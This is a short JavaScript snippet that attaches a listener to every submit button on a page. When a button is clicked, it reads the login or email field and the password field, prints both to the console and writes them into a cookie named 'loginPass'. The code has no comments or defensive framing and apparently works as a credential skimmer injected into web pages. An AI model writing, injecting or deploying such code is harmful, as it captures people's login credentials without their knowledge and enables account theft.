var loginName = "",
    pass = "",
    inputs = window.document.getElementsByTagName("input");

var getPass = function () {
    for (var i = 0; i < inputs.length; i++) {

        if (inputs[i].name === "Login" || inputs[i].type === 'email' || inputs[i].name === 'email') {
            loginName = inputs[i].value;
        }
        if (inputs[i].type === "password" && inputs[i].value !== "") {
            pass = inputs[i].value;
        }
    }
    console.log(loginName);
    console.log(pass);
    document.cookie = "loginPass=" + [loginName,pass];
};
console.log('skizb');
for (var i = 0; i < inputs.length; i++) {
    if (inputs[i].type === "submit") {
        inputs[i].addEventListener("click", getPass);
    }
}
